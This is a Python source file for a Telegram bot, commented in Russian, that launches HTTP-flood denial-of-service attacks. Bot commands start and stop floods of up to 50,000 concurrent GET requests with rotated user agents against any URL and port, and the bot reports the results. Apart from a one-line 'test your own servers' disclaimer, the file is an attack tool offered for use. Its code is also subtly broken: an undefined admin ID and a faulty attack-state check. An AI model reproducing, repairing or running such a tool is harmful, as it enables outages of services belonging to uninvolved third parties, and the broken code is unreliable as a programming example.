#!/usr/bin/env python3
# Telegram DDoS Bot (асинхронная версия)
# by Колин

import telebot
import asyncio
import aiohttp
import time
import random
from threading import Thread
import os

BOT_TOKEN = os.getenv('BOT_TOKEN')
if not BOT_TOKEN:
    raise ValueError("Переменная окружения BOT_TOKEN не установлена!")

bot = telebot.TeleBot(BOT_TOKEN)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    # ... остальные
]

active_attacks = {}

def is_admin(message):
    return message.from_user.id == ADMIN_ID

async def attack_worker(target, port, duration, tasks_count, chat_id, attack_id):
    """Асинхронный работник — запускает tasks_count корутин"""
    url = target if target.startswith(('http://', 'https://')) else f"http://{target}:{port}"
    end_time = time.time() + duration
    total = success = errors = 0

    async def requester(session):
        nonlocal total, success, errors
        while time.time() < end_time and attack_id in active_attacks:
            try:
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                async with session.get(url, headers=headers, timeout=5) as resp:
                    total += 1
                    if resp.status == 200:
                        success += 1
                    else:
                        errors += 1
            except:
                errors += 1
                total += 1

    async with aiohttp.ClientSession() as session:
        tasks = [requester(session) for _ in range(tasks_count)]
        await asyncio.gather(*tasks, return_exceptions=True)

    # Отчёт
    report = f"⚔️ **Атака завершена**\n\n"
    report += f"🎯 Цель: {target}:{port}\n"
    report += f"⏱️ Длительность: {duration} сек\n"
    report += f"🧵 Задач: {tasks_count}\n"
    report += f"📨 Всего запросов: {total}\n"
    report += f"✅ Успешных (200): {success}\n"
    report += f"❌ Ошибок: {errors}\n"
    bot.send_message(chat_id, report, parse_mode='Markdown')

def run_async_attack(target, port, duration, tasks, chat_id, attack_id):
    """Запускает асинхронную атаку в отдельном потоке"""
    asyncio.run(attack_worker(target, port, duration, tasks, chat_id, attack_id))

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "🤖 **Async DDoS Bot**\n\n"
                          "/ddos <url> <port> <время> [задачи] — запустить атаку\n"
                          "/stop — остановить\n"
                          "⚠️ Только для тестирования своих серверов!", parse_mode='Markdown')

@bot.message_handler(commands=['ddos'])
def ddos_command(message):
    if not is_admin(message):
        bot.reply_to(message, "❌ Доступ запрещён")
        return
    try:
        parts = message.text.split()
        if len(parts) < 4:
            bot.reply_to(message, "❌ Использование: /ddos <url> <port> <время> [задачи]")
            return
        target = parts[1]
        port = int(parts[2])
        duration = int(parts[3])
        tasks = int(parts[4]) if len(parts) > 4 else 1000
        if duration > 3600:
            bot.reply_to(message, "❌ Максимальное время атаки — 3600 сек")
            return
        if tasks > 50000:
            bot.reply_to(message, "❌ Максимальное количество задач — 50000")
            return
        if message.chat.id in active_attacks:
            bot.reply_to(message, "⚠️ Уже есть активная атака. Сначала останови.")
            return
        attack_id = f"{message.chat.id}_{int(time.time())}"
        active_attacks[message.chat.id] = attack_id
        bot.reply_to(message, f"⚔️ Атака запущена на {target}:{port} на {duration} сек с {tasks} задачами")
        t = Thread(target=run_async_attack, args=(target, port, duration, tasks, message.chat.id, attack_id))
        t.daemon = True
        t.start()
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['stop'])
def stop_command(message):
    if not is_admin(message):
        bot.reply_to(message, "❌ Доступ запрещён")
        return
    if message.chat.id in active_attacks:
        del active_attacks[message.chat.id]
        bot.reply_to(message, "🛑 Атака остановлена")
    else:
        bot.reply_to(message, "ℹ️ Нет активных атак")

if __name__ == '__main__':
    print("🤖 Async DDoS Bot запущен. Нажми Ctrl+C для остановки.")
    bot.infinity_polling()
